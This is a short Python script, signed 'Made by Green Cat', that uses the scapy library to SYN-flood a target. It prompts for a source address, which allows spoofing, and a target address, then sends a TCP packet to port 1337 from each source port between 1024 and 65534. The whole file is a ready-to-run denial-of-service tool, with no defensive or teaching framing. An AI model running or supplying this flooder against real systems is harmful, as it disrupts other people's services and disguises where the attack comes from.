#!/usr/bin/python

from scapy.all import *
def synflood(s, t):
	for sp in range(1024,65535):
	    a=IP(src=s, dst=t)
	    b=TCP(sport=sp,dport=1337)
	    p=a/b
	    send(p)
print('\033[92m'+'\033[1m''Made by Green Cat'+'\033[0m')
print('Enter Source : ',end='')
c=input()
print('Enter Target : ',end='')
d=input()
src=c
tgt=d
print('\033[91m'+'\033[1m')
synflood(src, tgt)
